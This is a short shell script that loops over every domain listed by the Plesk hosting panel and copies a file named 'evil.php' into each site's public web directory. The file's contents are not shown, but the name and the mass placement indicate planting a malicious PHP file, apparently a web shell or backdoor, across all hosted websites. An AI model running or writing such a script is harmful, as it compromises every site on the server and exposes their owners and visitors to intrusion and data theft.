#!/bin/sh
SRC="evil.php"
for d in $(plesk bin domain --list); do cp "$SRC" /var/www/vhosts/$d/httpdocs/; done
